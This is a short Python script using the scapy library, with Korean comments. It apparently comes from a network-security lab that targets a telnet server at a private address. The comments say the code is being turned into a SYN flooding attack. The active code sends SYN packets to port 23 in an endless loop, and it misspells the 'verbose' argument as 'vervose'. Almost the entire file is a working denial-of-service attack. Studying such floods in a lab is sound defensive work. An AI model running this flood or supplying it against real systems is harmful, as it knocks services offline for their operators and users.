from scapy.all import *

# 연결 요청하는 SYN 패킷 생성 - ex)우분투 텔넷 서버를 대상으로 요청함
# syn = IP (dst = "10.0.2.15") / TCP (sport = RandShort (), dport = 23, flags = "S")
# send (syn)


#SYN FLOODING 공격할 수 있는 코드로 변경
syn = IP (dst = "10.0.2.15") / TCP (sport = RandShort (), dport = 23, flags = "S")
while True:
    send (syn, vervose = False)
